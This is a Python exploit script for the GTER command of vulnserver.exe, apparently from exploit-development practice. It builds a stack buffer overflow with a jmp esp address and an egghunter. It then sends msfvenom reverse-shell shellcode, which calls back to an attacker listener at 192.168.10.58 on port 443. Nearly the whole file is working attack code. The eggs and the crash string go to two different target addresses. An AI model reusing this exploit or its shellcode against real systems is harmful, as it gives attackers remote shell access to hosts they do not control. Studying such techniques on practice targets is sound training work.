#!/usr/bin/python
#
# exploit code for the GTER command from "vulnserver.exe"
# previous version (see "test" repository) didn't work properly
# this one returns a reverse shell as expected.
#

import socket
import os
import sys
import struct

# msfvenom -p windows/shell_reverse_tcp -f python -b "\x00\x0a\x0d" -v shell -e x86/shikata_ga_nai LHOST=192.168.10.58 LPORT=443
#Payload size: 351 bytes
shell =  ""
shell += "\xb8\x99\xd1\xaf\xbd\xd9\xc9\xd9\x74\x24\xf4\x5f\x31"
shell += "\xc9\xb1\x52\x83\xef\xfc\x31\x47\x0e\x03\xde\xdf\x4d"
shell += "\x48\x1c\x37\x13\xb3\xdc\xc8\x74\x3d\x39\xf9\xb4\x59"
shell += "\x4a\xaa\x04\x29\x1e\x47\xee\x7f\x8a\xdc\x82\x57\xbd"
shell += "\x55\x28\x8e\xf0\x66\x01\xf2\x93\xe4\x58\x27\x73\xd4"
shell += "\x92\x3a\x72\x11\xce\xb7\x26\xca\x84\x6a\xd6\x7f\xd0"
shell += "\xb6\x5d\x33\xf4\xbe\x82\x84\xf7\xef\x15\x9e\xa1\x2f"
shell += "\x94\x73\xda\x79\x8e\x90\xe7\x30\x25\x62\x93\xc2\xef"
shell += "\xba\x5c\x68\xce\x72\xaf\x70\x17\xb4\x50\x07\x61\xc6"
shell += "\xed\x10\xb6\xb4\x29\x94\x2c\x1e\xb9\x0e\x88\x9e\x6e"
shell += "\xc8\x5b\xac\xdb\x9e\x03\xb1\xda\x73\x38\xcd\x57\x72"
shell += "\xee\x47\x23\x51\x2a\x03\xf7\xf8\x6b\xe9\x56\x04\x6b"
shell += "\x52\x06\xa0\xe0\x7f\x53\xd9\xab\x17\x90\xd0\x53\xe8"
shell += "\xbe\x63\x20\xda\x61\xd8\xae\x56\xe9\xc6\x29\x98\xc0"
shell += "\xbf\xa5\x67\xeb\xbf\xec\xa3\xbf\xef\x86\x02\xc0\x7b"
shell += "\x56\xaa\x15\x2b\x06\x04\xc6\x8c\xf6\xe4\xb6\x64\x1c"
shell += "\xeb\xe9\x95\x1f\x21\x82\x3c\xda\xa2\x6d\x68\xee\x08"
shell += "\x06\x6b\xee\x6d\x6d\xe2\x08\x07\x81\xa3\x83\xb0\x38"
shell += "\xee\x5f\x20\xc4\x24\x1a\x62\x4e\xcb\xdb\x2d\xa7\xa6"
shell += "\xcf\xda\x47\xfd\xad\x4d\x57\x2b\xd9\x12\xca\xb0\x19"
shell += "\x5c\xf7\x6e\x4e\x09\xc9\x66\x1a\xa7\x70\xd1\x38\x3a"
shell += "\xe4\x1a\xf8\xe1\xd5\xa5\x01\x67\x61\x82\x11\xb1\x6a"
shell += "\x8e\x45\x6d\x3d\x58\x33\xcb\x97\x2a\xed\x85\x44\xe5"
shell += "\x79\x53\xa7\x36\xff\x5c\xe2\xc0\x1f\xec\x5b\x95\x20"
shell += "\xc1\x0b\x11\x59\x3f\xac\xde\xb0\xfb\xdc\x94\x98\xaa"
shell += "\x74\x71\x49\xef\x18\x82\xa4\x2c\x25\x01\x4c\xcd\xd2"
shell += "\x19\x25\xc8\x9f\x9d\xd6\xa0\xb0\x4b\xd8\x17\xb0\x59"

# egghunter will search for T00WT00W and jump right after it
egghunter = ("\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x54\x30"
"\x30\x57\x8b\xfa"
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")

# Crash at 151 bytes actually
crash = "\x41" * (147 - len(egghunter) - 10)

# jmp esp address found in essfunc.dll
addr = struct.pack("<I", 0x62501203)

# that's our crash string :
# - GTER command + a few chars (actually, only a '.' is mandatory)
# - a few nops, then our egghunter
# - followed by a few more nops
# - then our EIP overwrite (jmp esp)
# - contents of ESP after crash (jump-back in order to land exactly on the egghunter)
# - and a few nops
buffer = "GTER /.:/" + crash + egghunter + "\x90" * 10 + addr + "\x90" * 10 + "\xeb\xc4"

print "[*] Sending ..."
# iterates through a few commands, maybe one of them will keep my payload...
for c in ["HELP", "GMON", "GDOG", "HTER", "LTER", "KSTAN"]:
	expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
	expl.connect(("192.168.242.66", 9999))
	print expl.recv(1024)
	# We send our final shellcode first, as it will reside in a malloc()'ed area
	# Second stage payload here with egg ("T00WT00W")
	egg = c + " " + "T00WT00W" + shell
	expl.send(egg)
	print "len: " + str(len(egg))

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(('192.168.10.176', 9999))
print expl.recv(1024)
# Then we send our crash string with our first stage payload
expl.send(buffer)
expl.close()
